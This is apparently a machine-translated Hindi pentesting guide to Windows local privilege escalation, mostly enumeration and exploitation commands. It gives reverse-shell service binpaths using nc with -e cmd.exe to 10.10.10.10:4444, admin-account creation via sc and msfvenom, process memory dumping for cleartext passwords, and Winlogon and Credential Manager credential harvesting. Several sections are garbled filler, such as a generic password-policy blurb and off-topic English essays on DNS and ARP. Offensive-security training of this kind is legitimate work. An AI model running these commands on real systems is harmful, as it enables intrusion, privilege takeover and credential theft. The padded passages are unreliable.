विंडोज में होम फ़ोल्डर्स उपयोगकर्ता खातों के लिए निर्दिष्ट स्थान होते हैं। इन फ़ोल्डर्स में उपयोगकर्ता के निजी डेटा, दस्तावेज़, डेस्कटॉप आइटम्स, और अन्य संबंधित फ़ाइलें संग्रहित होती हैं। होम फ़ोल्डर्स का मार्ग प्राथमिकता स्थानांतरण के दौरान बनाए रखना चाहिए, क्योंकि इससे उपयोगकर्ता डेटा की सुरक्षा और उपयोगकर्ता अनुभव में सुधार होता है।

विंडोज में हर उपयोगकर्ता के लिए एक अलग होम फ़ोल्डर होता है, जिसे उपयोगकर्ता के नाम से निर्दिष्ट किया जाता है। उपयोगकर्ता खाते को बनाते समय, विंडोज आपको एक डिफ़ॉल्ट होम फ़ोल्डर का विकल्प प्रदान करता है, लेकिन आप इसे बदल सकते हैं।

उपयोगकर्ता खाते के होम फ़ोल्डर में निम्नलिखित उपयोगकर्ता डेटा और फ़ाइलें संग्रहित हो सकती हैं:

- दस्तावेज़: टेक्स्ट दस्तावेज़, स्प्रेडशीट, प्रेज़ेंटेशन आदि।
- डेस्कटॉप आइटम्स: डेस्कटॉप पर दिखाई देने वाले फ़ाइलें और फ़ोल्डर्स।
- डाउनलोड्स: इंटरनेट से डाउनलोड की गई फ़ाइलें।
- म्यूज़िक: ऑडियो फ़ाइलें और संगीत प्लेलिस्ट्स।
- पिक्चर्स: छवियाँ और फ़ोटो एल्बम।
- वीडियो: वीडियो फ़ाइलें।
- डॉक्यूमेंट्स: अन्य दस्तावेज़ फ़ाइलें।

यदि आप विंडोज में होम फ़ोल्डर्स को हार्डन करना चाहते हैं, तो आप निम्नलिखित कदमों का पालन कर सकते हैं:

1. उपयोगकर्ता खाते को बनाने के दौरान एक अलग होम फ़ोल्डर निर्दिष्ट करें।
2. उपयोगकर्ता खाते के लिए अधिकारिकता सेट करें ताकि केवल उपयोगकर्ता खाते तक ही पहुंच हो सके।
3. उपयोगकर्ता खाते के लिए शक्तिशाली पासवर्ड निर्धारित करें।
4. अनावश्यक उपयोगकर्ता खातों को हटा दें या अक्षम करें।
5. उपयोगकर्ता डेटा के लिए एक बैकअप निर्मित करें और नियमित रूप से बैकअप लें।

यदि आप विंडोज में होम फ़ोल्डर्स के बारे में और अधिक जानकारी चाहते हैं, तो आप विंडोज डॉक्यूमेंटेशन और वेबसाइटों का उपयोग कर सकते हैं।
```
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति

एक मजबूत पासवर्ड नीति अपनाना अत्यंत महत्वपूर्ण है ताकि किसी भी अनधिकृत उपयोगकर्ता को आपके सिस्टम में प्रवेश करने से रोका जा सके। निम्नलिखित नीति के अनुसार एक मजबूत पासवर्ड निर्धारित करें:

- पासवर्ड की लंबाई कम से कम 8 वर्ण होनी चाहिए।
- पासवर्ड में कम से कम एक अपरकेस अक्षर (A-Z), एक लोअरकेस अक्षर (a-z), एक संख्या (0-9), और एक विशेष वर्ण (!@#$%^&*) होना चाहिए।
- पासवर्ड में अद्यतित तिथि के बाद 90 दिनों के बाद परिवर्तन करना चाहिए।
- पिछले 5 पासवर्ड को नया पासवर्ड नहीं बनाना चाहिए।
- उपयोगकर्ता को अद्यतित पासवर्ड बनाने के लिए प्रोम्प्ट करना चाहिए।

यदि आप इन नीतियों का पालन करते हैं, तो आपके सिस्टम को सुरक्षित रखने में मदद मिलेगी और अनधिकृत पहुंच से बचाएगी।
```
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें

To get the content of the clipboard in Windows, you can use the following methods:

#### Method 1: Command Prompt

1. Open the Command Prompt as an administrator.
2. Type the following command and press Enter:
   ```
   powershell -command "Get-Clipboard"
   ```

#### Method 2: PowerShell

1. Open PowerShell as an administrator.
2. Use the following command to get the clipboard content:
   ```
   Get-Clipboard
   ```

After executing either of these methods, the content of the clipboard will be displayed in the console output.
```bash
powershell -command "Get-Clipboard"
```
## चल रहे प्रक्रियाएँ

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रक्रियाओं की सूची बनाने के बाद **प्रक्रिया के कमांड लाइन में पासवर्ड जांचें**।\
यह जांचें कि क्या आप **चल रहे किसी बाइनरी को अधिलेखित कर सकते हैं** या क्या आपके पास बाइनरी फ़ोल्डर की लिखने की अनुमति है जिससे संभावित [**DLL Hijacking हमलों**](dll-hijacking.md) का शोधार्थ किया जा सकता है।
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा संभावित [**electron/cef/chromium debuggers** की जांच करें, यहां आप इसका दुरुपयोग करके विशेषाधिकारों को बढ़ा सकते हैं](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)।

**प्रक्रिया बाइनरी की अनुमतियों की जांच करना**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रक्रिया बाइनरी के फ़ोल्डरों की अनुमतियों की जांच (DLL Hijacking)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### मेमोरी पासवर्ड माइनिंग

आप **सिसइंटरनल्स** के **प्रोसीडंप** का उपयोग करके एक चल रहे प्रक्रिया की मेमोरी डंप बना सकते हैं। FTP जैसी सेवाओं में **मेमोरी में स्पष्ट पाठ में प्रमाणीकरण** होता है, मेमोरी को डंप करके प्रमाणीकरण पढ़ने का प्रयास करें।
```
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI ऐप्स

**सिस्टम के रूप में चल रहे ऐप्स एक उपयोगकर्ता को CMD को उत्पन्न करने या निर्देशिकाओं को ब्राउज़ करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" के लिए खोजें, "Click to open Command Prompt" पर क्लिक करें

## सेवाएं

सेवाओं की सूची प्राप्त करें:
```
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप **sc** का उपयोग करके एक सेवा की जानकारी प्राप्त कर सकते हैं।
```
sc qc <service_name>
```
यह सिफारिश की जाती है कि प्रत्येक सेवा के लिए आवश्यक विशेषाधिकार स्तर की जांच करने के लिए _Sysinternals_ से बाइनरी **accesschk** होना चाहिए।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह सुझाव दिया जाता है कि जांचें कि "प्रमाणित उपयोगकर्ता" क्या किसी भी सेवा को संशोधित कर सकता है:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[आप यहां से XP के लिए accesschk.exe डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि हो रही है (उदाहरण के लिए SSDPSRV के साथ):

_सिस्टम त्रुटि 1058 हुई है._\
_सेवा शुरू नहीं की जा सकती है, या तो इसे अक्षम किया गया है या इसके साथ कोई सक्षम उपकरण जुड़ा हुआ नहीं है._

आप इसे सक्षम कर सकते हैं उपयोग करके
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान दें कि सेवा upnphost SSDPSRV पर निर्भर करती है ताकि काम कर सके (XP SP1 के लिए)**

**इस समस्या का एक और उपाय** है निम्नलिखित को चलाना:
```
sc.exe config usosvc start= auto
```
### **सेवा बाइनरी पथ को संशोधित करें**

यदि समूह "प्रमाणित उपयोगकर्ता" में सेवा में **SERVICE\_ALL\_ACCESS** है, तो वह सेवा द्वारा निष्पादित होने वाली बाइनरी को संशोधित कर सकता है। इसे संशोधित करने और **nc** को निष्पादित करने के लिए आप निम्नलिखित कर सकते हैं:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनः चालू करें

To restart a service in Windows, you can use the following steps:

1. Open the Command Prompt as an administrator. (Right-click on the Start button and select "Command Prompt (Admin)" or search for "cmd" in the Start menu, right-click on "Command Prompt" and select "Run as administrator".)

2. Use the `sc` command followed by the service name to stop the service. For example, to stop the "MyService" service, run the following command:
   ```
   sc stop MyService
   ```

3. Wait for the service to stop. You can check the status of the service by running the following command:
   ```
   sc query MyService
   ```

4. Once the service has stopped, use the `sc` command again to start the service. For example, to start the "MyService" service, run the following command:
   ```
   sc start MyService
   ```

5. Verify that the service has started successfully by running the following command:
   ```
   sc query MyService
   ```

By following these steps, you can restart a service in Windows and ensure that any changes or updates to the service take effect.
```
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
अन्य अनुमतियों का उपयोग अधिकारों को बढ़ाने के लिए किया जा सकता है:\
**SERVICE\_CHANGE\_CONFIG** सेवा बाइनरी को पुनर्विन्यास कर सकता है\
**WRITE\_DAC:** अनुमतियों को पुनर्विन्यास कर सकता है, जो SERVICE\_CHANGE\_CONFIG में ले जाता है\
**WRITE\_OWNER:** मालिक बन सकता है, अनुमतियों को पुनर्विन्यास कर सकता है\
**GENERIC\_WRITE:** SERVICE\_CHANGE\_CONFIG को अनुग्रहित करता है\
**GENERIC\_ALL:** SERVICE\_CHANGE\_CONFIG को अनुग्रहित करता है

**इस सुरक्षा दुरुपयोग का पता लगाने और शोधन करने** के लिए आप _exploit/windows/local/service\_permissions_ का उपयोग कर सकते हैं

### सेवा बाइनरी कमजोर अनुमतियाँ

**जांचें कि क्या आप सेवा द्वारा निष्पादित बाइनरी को संशोधित कर सकते हैं** या क्या आपके पास बाइनरी स्थित फ़ोल्डर पर **लेखन अनुमतियाँ** हैं ([**DLL Hijacking**](dll-hijacking.md))**.**\
आप **wmic** (system32 में नहीं) का उपयोग करके सेवा द्वारा निष्पादित होने वाली हर बाइनरी प्राप्त कर सकते हैं और **icacls** का उपयोग करके अपनी अनुमतियों की जांच कर सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप भी **sc** और **icacls** का उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### सेवा रजिस्ट्री संशोधन अनुमतियाँ

आपको यह जांचना चाहिए कि क्या आप किसी सेवा रजिस्ट्री को संशोधित कर सकते हैं।\
आप एक सेवा रजिस्ट्री पर अपनी अनुमतियों की जांच कर सकते हैं:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
जांचें कि **प्रमाणित उपयोगकर्ता** या **NT AUTHORITY\INTERACTIVE** में FullControl है। इस मामले में आप सेवा द्वारा निष्पादित किए जाने वाले बाइनरी को बदल सकते हैं।

निष्पादित बाइनरी का पथ बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### सेवाओं रजिस्ट्री AppendData/AddSubdirectory अनुमतियाँ

यदि आपके पास इस रजिस्ट्री पर यह अनुमति है, तो इसका अर्थ है कि **आप इससे उप-रजिस्ट्री बना सकते हैं**। विंडोज सेवाओं के मामले में यह **किसी भी अवचेतन कोड को निष्पादित करने के लिए पर्याप्त है:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### अनकोटेड सेवा पथ

यदि किसी कार्यक्रम के पथ में कोई उद्धरण नहीं है, तो विंडोज हर स्पेस से पहले सभी अंत को निष्पादित करने का प्रयास करेगा।

उदाहरण के लिए, पथ _C:\Program Files\Some Folder\Service.exe_ के लिए विंडोज निम्नलिखित को निष्पादित करने का प्रयास करेगा:
```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
अन-कोट की गई सभी सेवा पथों की सूची बनाने के लिए (बिल्ट-इन Windows सेवाओं को छोड़कर)
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस दुर्बलता का पता लगा सकते हैं और इसे उत्पन्न कर सकते हैं** मेटास्प्लोइट के साथ: _exploit/windows/local/trusted\_service\_path_\
आप मेटास्प्लोइट के साथ मैन्युअल रूप से एक सेवा बाइनरी बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### कार्रवाई उपाय

यह संभव है कि विंडोज को इंडिकेट किया जा सकता है कि जब एक सेवा को निष्पादित करने में विफलता होती है तो वह क्या करना चाहिए। यदि उस सेटिंग का उपयोग एक बाइनरी को पॉइंट कर रहा है और यह बाइनरी ओवरराइट की जा सकती है, तो आपको वर्धित विशेषाधिकार प्राप्त करने की संभावना हो सकती है।

## अनुप्रयोग

### स्थापित अनुप्रयोग

**बाइनरी की अनुमतियों** की जांच करें (शायद आप एक को ओवरराइट करके विशेषाधिकार वर्धित कर सकते हैं) और **फ़ोल्डरों** की ([DLL हाइजैकिंग](dll-hijacking.md))।
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लेखन अनुमतियाँ

जांचें कि क्या आप किसी कॉन्फ़िग फ़ाइल को संशोधित कर सकते हैं ताकि आप कुछ विशेष फ़ाइल को पढ़ सकें या यदि आप किसी ऐडमिनिस्ट्रेटर खाते (schedtasks) द्वारा निष्पादित किसी बाइनरी को संशोधित कर सकते हैं।

सिस्टम में कमजोर फ़ोल्डर / फ़ाइल अनुमतियों को खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### स्टार्टअप पर चलाएं

**जांचें कि क्या आप किसी ऐसे रजिस्ट्री या बाइनरी को अधिकार देने के लिए ओवरराइट कर सकते हैं जो एक अलग उपयोगकर्ता द्वारा चलाया जाएगा।**\
**इंटरेस्टिंग ऑटोरन्स स्थानों को उन्नत करने के लिए** निम्नलिखित **पृष्ठ** को **पढ़ें**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### ड्राइवर्स

**संभावित** तृतीय पक्ष **अजीब/जोखिम भरे** ड्राइवर्स ढूंढें
```
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL हाइजैकिंग

यदि आपके पास PATH पर मौजूद एक फ़ोल्डर में **लिखने की अनुमति** है, तो आप DLL को हाइजैक करके किसी प्रक्रिया द्वारा लोड किए जाने वाले DLL को हाइजैक कर सकते हैं और **उच्चतम अधिकार प्राप्त कर सकते हैं**।

PATH में सभी फ़ोल्डरों की अनुमतियों की जांच करें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस चेक को अधिक जानकारी के लिए निम्नलिखित देखें:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## नेटवर्क

### शेयर्स
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### होस्ट फ़ाइल

होस्ट फ़ाइल पर हार्डकोड किए गए अन्य ज्ञात कंप्यूटरों की जांच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस और DNS

In this section, we will discuss network interfaces and DNS settings that can be exploited for privilege escalation.

#### Network Interfaces

Network interfaces are the connections between a computer and a network. These interfaces can be physical (such as Ethernet or Wi-Fi) or virtual (such as VPN or virtual machines). Exploiting network interfaces can provide an attacker with additional privileges.

##### Network Interface Enumeration

To enumerate network interfaces on a Windows system, you can use the following commands:

```bash
ipconfig /all
```

This command will display detailed information about all network interfaces, including their IP addresses, MAC addresses, and DNS settings.

##### Network Interface Misconfigurations

Misconfigurations in network interfaces can lead to privilege escalation. Some common misconfigurations include:

- **Promiscuous Mode**: Enabling promiscuous mode on a network interface allows it to capture all network traffic, including traffic that is not intended for the interface. This can be exploited by an attacker to intercept sensitive information.

- **Weak Passwords**: Weak passwords on network interfaces can be easily cracked, allowing an attacker to gain unauthorized access.

- **Unpatched Vulnerabilities**: Network interfaces may have unpatched vulnerabilities that can be exploited by an attacker to gain elevated privileges.

#### DNS Settings

DNS (Domain Name System) is responsible for translating domain names into IP addresses. Exploiting DNS settings can allow an attacker to redirect network traffic and gain unauthorized access.

##### DNS Cache Poisoning

DNS cache poisoning is a technique where an attacker injects malicious DNS records into a DNS cache. This can be used to redirect network traffic to a malicious server controlled by the attacker.

##### DNS Spoofing

DNS spoofing is a technique where an attacker intercepts DNS requests and responds with false information. This can be used to redirect network traffic to a malicious server controlled by the attacker.

##### DNS Hijacking

DNS hijacking is a technique where an attacker gains control over a DNS server and redirects DNS requests to a malicious server controlled by the attacker.

##### DNS Misconfigurations

Misconfigurations in DNS settings can lead to privilege escalation. Some common misconfigurations include:

- **Open DNS Resolvers**: Open DNS resolvers allow anyone to use them for DNS queries. This can be exploited by an attacker to launch DNS amplification attacks or perform DNS cache poisoning.

- **Weak DNS Zone Transfers**: Weak DNS zone transfer settings can allow an attacker to obtain a copy of the DNS zone file, which may contain sensitive information.

- **Unpatched DNS Software**: DNS software may have unpatched vulnerabilities that can be exploited by an attacker to gain elevated privileges.

#### Conclusion

Network interfaces and DNS settings can be exploited for privilege escalation. It is important to properly configure and secure these components to prevent unauthorized access and maintain the security of a system.
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### खुले पोर्ट्स

बाहर से **प्रतिबंधित सेवाओं** की जांच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग टेबल

एक रूटिंग टेबल एक डेटा संरचना है जो नेटवर्क डेटा पैकेट्स को उनके लक्ष्य नेटवर्क तक पहुंचाने के लिए उपयोग होती है। यह टेबल नेटवर्क इंटरफेसों, नेटवर्क पतों, और नेटवर्क गेटवे के बीच संचार स्थापित करता है। रूटिंग टेबल में नेटवर्क पते, नेटवर्क मास्क, नेक्स्ट हॉप और इंटरफेस के बीच कनेक्शन की जानकारी होती है। यह टेबल नेटवर्क ट्रैफिक को सही राउट पर भेजने के लिए उपयोग होता है।

एक रूटिंग टेबल में एंट्री द्वारा निर्दिष्ट नेटवर्क पते के लिए एक निर्दिष्ट नेटवर्क इंटरफेस और नेटवर्क गेटवे का चयन किया जाता है। जब एक नेटवर्क पैकेट आता है, रूटिंग टेबल उसे उचित नेटवर्क इंटरफेस और नेटवर्क गेटवे के माध्यम से भेजता है ताकि यह उचित लक्ष्य नेटवर्क तक पहुंच सके।

एक रूटिंग टेबल को अपडेट करने के लिए, रूटिंग प्रोटोकॉल्स जैसे कि RIP (Routing Information Protocol), OSPF (Open Shortest Path First), और BGP (Border Gateway Protocol) का उपयोग किया जाता है। ये प्रोटोकॉल्स नेटवर्क ट्रैफिक के लिए सबसे अच्छा मार्ग चुनने में मदद करते हैं और रूटिंग टेबल को अपडेट करते हैं जब नेटवर्क टोपोलॉजी में कोई परिवर्तन होता है।
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका

ARP तालिका एक नेटवर्क डिवाइस के लिए एक नेटवर्क पते और उसके मेक-एड्रेस (MAC) पते के बीच मैपिंग प्रदान करती है। यह एक डायनामिक तालिका होती है, जिसे नेटवर्क डिवाइस द्वारा स्वचालित रूप से अद्यतित किया जाता है। ARP तालिका में, नेटवर्क पते और MAC पते के बीच की मैपिंग एंट्रीज़ होती हैं।

ARP तालिका का उपयोग नेटवर्क डिवाइस के लिए डेटा पैकेट को उचित रूप से प्रेषित करने के लिए किया जाता है। जब एक नेटवर्क डिवाइस एक अन्य नेटवर्क डिवाइस के साथ संचार करना चाहता है, तो वह ARP तालिका में उस नेटवर्क पते के लिए MAC पता खोजता है। यदि तालिका में एंट्री मौजूद है, तो नेटवर्क डिवाइस उस MAC पते का उपयोग करके डेटा पैकेट को प्रेषित करता है। यदि तालिका में एंट्री नहीं है, तो नेटवर्क डिवाइस एक ARP रिक्वेस्ट भेजकर उस नेटवर्क पते के लिए MAC पता प्राप्त करने का प्रयास करेगा। जब यह प्राप्त हो जाता है, तो तालिका में नई मैपिंग एंट्री जोड़ी जाती है और डेटा पैकेट प्रेषित किया जाता है।

ARP तालिका को एक हैकर के लिए उपयोगी जानकारी प्रदान कर सकती है, क्योंकि इसका उपयोग नेटवर्क डिवाइस के बीच की संचार को अवरोधित करने या अनुरोधित करने के लिए किया जा सकता है। एक हैकर ARP तालिका को देखकर नेटवर्क परियोजनाओं को अधिक अच्छी तरह से समझ सकता है और उन्हें अधिक प्रभावी ढंग से नियंत्रित कर सकता है।
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### फ़ायरवॉल नियम

[**फ़ायरवॉल संबंधित कमांड्स के लिए इस पेज की जांच करें**](../basic-cmd-for-pentesters.md#firewall) **(नियम सूची, नियम बनाएं, बंद करें, बंद करें...)**

और [यहां नेटवर्क जांच के लिए कमांड्स](../basic-cmd-for-pentesters.md#network) हैं।

### Windows Subsystem for Linux (wsl)
```
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है।

यदि आप रूट उपयोगकर्ता प्राप्त करते हैं तो आप किसी भी पोर्ट पर सुन सकते हैं (पहली बार जब आप `nc.exe` का उपयोग करके किसी पोर्ट पर सुनने के लिए करेंगे, तो यह फ़ायरवॉल द्वारा `nc` को अनुमति देने के लिए GUI के माध्यम से पूछेगा)।
```
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
आसानी से रूट के रूप में बैश शुरू करने के लिए, आप `--default-user root` की कोशिश कर सकते हैं।

आप `WSL` फ़ाइल सिस्टम को खोजने के लिए फ़ोल्डर `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` में जा सकते हैं।

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### क्रेडेंशियल प्रबंधक / विंडोज वॉल्ट

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault) से\
विंडोज वॉल्ट विंडोज उपयोगकर्ताओं के लिए सर्वर, वेबसाइट और अन्य कार्यक्रमों के प्रमाणपत्र संग्रहित करता है जिन्हें **विंडोज** उपयोगकर्ता स्वचालित रूप से लॉग इन कर सकता है। पहली नजर में, ऐसा दिख सकता है कि अब उपयोगकर्ता अपने फेसबुक प्रमाणपत्र, ट्विटर प्रमाणपत्र, जीमेल प्रमाणपत्र आदि को संग्रहीत कर सकते हैं, ताकि वे ब्राउज़र के माध्यम से स्वचालित रूप से लॉग इन हों। लेकिन ऐसा नहीं है।

विंडोज वॉल्ट उन प्रमाणपत्रों को संग्रहीत करता है जिन्हें विंडोज स्वचालित रूप से उपयोगकर्ताओं को लॉग इन करने के लिए चाहिए, जिसका मतलब है कि किसी भी **विंडोज एप्लिकेशन जो किसी संसाधन तक पहुंच के लिए प्रमाणपत्रों की आवश्यकता होती है** (सर्वर या वेबसाइट) **इस क्रेडेंशियल प्रबंधक** और विंडोज वॉल्ट का उपयोग कर सकता है और उपयोगकर्ताओं के द्वारा प्रदान की गई प्रमाणपत्रों का उपयोग कर सकता है बिना उपयोगकर्ताओं को बार-बार उपयोगकर्ता नाम और पासवर्ड दर्ज करने की आवश्यकता होती है।

यदि एप्लिकेशन्स क्रेडेंशियल प्रबंधक के साथ संवाद नहीं करते हैं, तो मुझे लगता है कि उन्हें दिए गए संसाधन के लिए प्रमाणपत्रों का उपयोग करना संभव नहीं है। तो, यदि आपके एप्लिकेशन को वॉल्ट का उपयोग करना है, तो उसे किसी तरह से **क्रेडेंशियल प्रबंधक के साथ संवाद करना चाहिए और डिफ़ॉल्ट संग्रहीत वॉल्ट से उस संसाधन के लिए प्रमाणपत्रों का अनुरोध करना चाहिए**।

मशीन पर संग्रहीत प्रमाणपत्रों की सूची के लिए `cmdkey` का उपयोग करें।
```
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
